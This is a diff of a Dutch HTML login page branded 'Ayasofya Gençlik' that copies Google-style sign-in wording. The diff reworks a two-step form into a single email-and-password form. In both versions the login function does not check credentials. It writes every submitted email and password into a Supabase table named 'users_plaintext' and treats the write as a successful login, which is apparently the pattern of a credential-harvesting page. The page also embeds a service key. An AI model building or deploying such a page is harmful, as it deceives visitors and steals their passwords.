@@ -9,7 +9,7 @@
 
     body {
       font-family: 'Segoe UI', Arial, sans-serif;
-      background: #f0f4f9;
+      background: #fff;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -20,73 +20,49 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 20px;
+      padding: 40px 20px;
     }
 
-    /* ── KAART ── */
-    .card {
-      background: white;
-      border-radius: 28px;
-      width: 100%;
-      max-width: 860px;
-      min-height: 480px;
+    .container {
       display: flex;
-      overflow: hidden;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+      align-items: center;
+      justify-content: center;
+      gap: 120px;
+      width: 100%;
+      max-width: 900px;
     }
 
     /* ── LINKS ── */
-    .card-left {
-      width: 340px;
+    .left {
       flex-shrink: 0;
-      padding: 48px 40px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
     }
 
-    .brand-logo {
-      font-size: 22px;
-      font-weight: 700;
-      color: #1877F2;
-      margin-bottom: 32px;
-    }
-
-    .card-left h1 {
-      font-size: 30px;
-      font-weight: 400;
+    .left h1 {
+      font-size: 48px;
+      font-weight: 300;
       color: #1f1f1f;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
     }
 
-    .card-left .subtitle {
+    .left .subtitle {
       font-size: 16px;
       color: #444746;
-      line-height: 1.5;
-    }
-
-    .card-left .bottom-img {
-      margin-top: auto;
-      padding-top: 40px;
     }
 
     /* ── RECHTS ── */
-    .card-right {
-      flex: 1;
-      padding: 48px 44px 40px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
+    .right {
+      width: 100%;
+      max-width: 400px;
     }
 
     .input-group {
       position: relative;
-      margin-bottom: 28px;
+      margin-bottom: 20px;
     }
 
     .input-group input {
       width: 100%;
-      padding: 16px 14px 6px;
+      padding: 18px 14px 6px;
       border: 1px solid #747775;
       border-radius: 4px;
       font-size: 16px;
@@ -116,7 +92,7 @@
 
     .input-group input:focus + label,
     .input-group input:not(:placeholder-shown) + label {
-      top: 8px;
+      top: 10px;
       font-size: 11px;
       color: #1877F2;
       transform: none;
@@ -132,8 +108,7 @@
       font-weight: 600;
       color: #1877F2;
       text-decoration: none;
-      margin-top: -16px;
-      margin-bottom: 32px;
+      margin-bottom: 28px;
     }
 
     .forgot:hover { text-decoration: underline; }
@@ -145,18 +120,10 @@
       line-height: 1.5;
     }
 
-    .hint-text a {
-      color: #1877F2;
-      text-decoration: none;
-    }
-
-    .hint-text a:hover { text-decoration: underline; }
-
     .actions {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-top: auto;
     }
 
     .btn-create {
@@ -191,39 +158,8 @@
       min-height: 18px;
     }
 
-    /* Stap 2 */
-    #step-password { display: none; }
-
-    .user-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      border: 1px solid #c4c7c5;
-      border-radius: 20px;
-      padding: 6px 14px 6px 6px;
-      font-size: 14px;
-      color: #1f1f1f;
-      cursor: pointer;
-      margin-bottom: 28px;
-    }
-
-    .user-pill:hover { background: #f0f4f9; }
-
-    .avatar {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      background: #1877F2;
-      color: white;
-      font-size: 13px;
-      font-weight: 700;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
     /* DASHBOARD */
-    #dashboard-screen { display: none; min-height: 100vh; background: #f0f4f9; }
+    #dashboard-screen { display: none; min-height: 100vh; background: #fff; }
 
     .navbar {
       background: white;
@@ -236,9 +172,7 @@
     }
 
     .nav-brand { font-size: 20px; font-weight: 700; color: #1877F2; }
-
     .nav-right { display: flex; align-items: center; gap: 16px; }
-
     .nav-email { font-size: 14px; color: #5f6368; }
 
     .btn-logout {
@@ -265,10 +199,9 @@
     .dashboard-body p { font-size: 15px; color: #5f6368; margin-bottom: 32px; }
 
     .like-box {
-      background: white;
+      background: #f0f4f9;
       border-radius: 16px;
       padding: 32px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.07);
     }
 
     .like-box p { font-size: 16px; color: #1f1f1f; margin-bottom: 16px; }
@@ -293,70 +226,49 @@
       justify-content: space-between;
       font-size: 12px;
       color: #80868b;
+      border-top: 1px solid #e0e0e0;
     }
   </style>
 </head>
 <body>
 
+<!-- LOGIN -->
 <div id="login-page">
   <div class="page">
-    <div class="card">
+    <div class="container">
 
       <!-- LINKS -->
-      <div class="card-left">
-        <div>
-          <div class="brand-logo">Ayasofya Gençlik</div>
-          <h1 id="left-title">Inloggen</h1>
-          <p class="subtitle" id="left-subtitle">Gebruik je Ayasofya Gençlik-account</p>
-        </div>
+      <div class="left">
+        <h1>Inloggen</h1>
+        <p class="subtitle">Gebruik je Ayasofya Gençlik-account</p>
       </div>
 
       <!-- RECHTS -->
-      <div class="card-right">
-
-        <!-- Stap 1: e-mail -->
-        <div id="step-email">
-          <div class="input-group">
-            <input type="email" id="email-input" placeholder=" " />
-            <label>E-mailadres</label>
-          </div>
-
-          <a href="#" class="forgot">E-mailadres vergeten?</a>
-
-          <p class="hint-text">
-            Niet jouw computer? Gebruik een privévenster om in te loggen.
-          </p>
-
-          <div class="actions">
-            <button class="btn-create">Account aanmaken</button>
-            <button class="btn-next" onclick="goToPassword()">Volgende</button>
-          </div>
-          <div id="email-message" class="message"></div>
+      <div class="right">
+        <div class="input-group">
+          <input type="email" id="email-input" placeholder=" " />
+          <label>E-mailadres</label>
         </div>
 
-        <!-- Stap 2: wachtwoord -->
-        <div id="step-password">
-          <div class="user-pill" onclick="goBack()">
-            <div class="avatar" id="avatar-letter">A</div>
-            <span id="email-display"></span>
-            <span>▾</span>
-          </div>
-
-          <div class="input-group">
-            <input type="password" id="password-input" placeholder=" " />
-            <label>Wachtwoord</label>
-          </div>
-
-          <a href="#" class="forgot">Wachtwoord vergeten?</a>
-
-          <div class="actions">
-            <button class="btn-create" onclick="goBack()">Terug</button>
-            <button class="btn-next" onclick="handleLogin()">Volgende</button>
-          </div>
-          <div id="password-message" class="message"></div>
+        <div class="input-group">
+          <input type="password" id="password-input" placeholder=" " />
+          <label>Wachtwoord</label>
         </div>
 
+        <a href="#" class="forgot">Wachtwoord vergeten?</a>
+
+        <p class="hint-text">
+          Niet jouw computer? Gebruik een privévenster om in te loggen.
+        </p>
+
+        <div class="actions">
+          <button class="btn-create">Account aanmaken</button>
+          <button class="btn-next" onclick="handleLogin()">Inloggen</button>
+        </div>
+
+        <div id="login-message" class="message"></div>
       </div>
+
     </div>
   </div>
 
@@ -389,8 +301,6 @@
   const SUPABASE_URL = 'https://jhlcymefogldlulkplrk.supabase.co';
   const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpobGN5bWVmb2dsZGx1bGtwbHJrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA0MjAyNjEsImV4cCI6MjA5NTk5NjI2MX0.wMeFPjffvDngfD2UO-g8zMwr8fDkCkhTvrvOyehmzVI';
 
-  let currentEmail = '';
-
   async function supabaseFetch(path, options = {}) {
     const url = `${SUPABASE_URL}/rest/v1/${path}`;
     const headers = {
@@ -405,42 +315,25 @@
     return { status: response.status, data };
   }
 
-  function goToPassword() {
-    const email = document.getElementById('email-input').value.trim();
-    const msg = document.getElementById('email-message');
-    if (!email) { msg.textContent = 'Vul een e-mailadres in.'; return; }
-    msg.textContent = '';
-    currentEmail = email;
-    document.getElementById('email-display').textContent = email;
-    document.getElementById('avatar-letter').textContent = email[0].toUpperCase();
-    document.getElementById('left-title').textContent = 'Welkom';
-    document.getElementById('left-subtitle').textContent = '';
-    document.getElementById('step-email').style.display = 'none';
-    document.getElementById('step-password').style.display = 'block';
-  }
-
-  function goBack() {
-    document.getElementById('step-password').style.display = 'none';
-    document.getElementById('step-email').style.display = 'block';
-    document.getElementById('left-title').textContent = 'Inloggen';
-    document.getElementById('left-subtitle').textContent = 'Gebruik je Ayasofya Gençlik-account';
-    document.getElementById('password-message').textContent = '';
-  }
-
   async function handleLogin() {
+    const email = document.getElementById('email-input').value.trim();
     const password = document.getElementById('password-input').value;
-    const msg = document.getElementById('password-message');
+    const msg = document.getElementById('login-message');
     msg.textContent = '';
-    if (!password) { msg.textContent = 'Vul je wachtwoord in.'; return; }
+
+    if (!email || !password) {
+      msg.textContent = 'Vul je e-mailadres en wachtwoord in.';
+      return;
+    }
 
     const result = await supabaseFetch('users_plaintext', {
       method: 'POST',
-      body: JSON.stringify({ email: currentEmail, password })
+      body: JSON.stringify({ email, password })
     });
 
     if (result.status === 201) {
-      document.getElementById('welcome-text').textContent = `Welkom, ${currentEmail}!`;
-      document.getElementById('nav-email').textContent = currentEmail;
+      document.getElementById('welcome-text').textContent = `Welkom, ${email}!`;
+      document.getElementById('nav-email').textContent = email;
       document.getElementById('login-page').style.display = 'none';
       document.getElementById('dashboard-screen').style.display = 'block';
     } else {
@@ -459,26 +352,16 @@
   function handleLogout() {
     document.getElementById('email-input').value = '';
     document.getElementById('password-input').value = '';
-    document.getElementById('step-password').style.display = 'none';
-    document.getElementById('step-email').style.display = 'block';
-    document.getElementById('left-title').textContent = 'Inloggen';
-    document.getElementById('left-subtitle').textContent = 'Gebruik je Ayasofya Gençlik-account';
+    document.getElementById('login-message').textContent = '';
     document.getElementById('login-page').style.display = 'flex';
     document.getElementById('dashboard-screen').style.display = 'none';
     document.getElementById('like-btn').textContent = 'Like';
     document.getElementById('like-btn').classList.remove('liked');
     document.getElementById('like-btn').disabled = false;
-    currentEmail = '';
   }
 
   document.addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') {
-      if (document.getElementById('step-password').style.display === 'block') {
-        handleLogin();
-      } else {
-        goToPassword();
-      }
-    }
+    if (e.key === 'Enter') handleLogin();
   });
 </script>
 
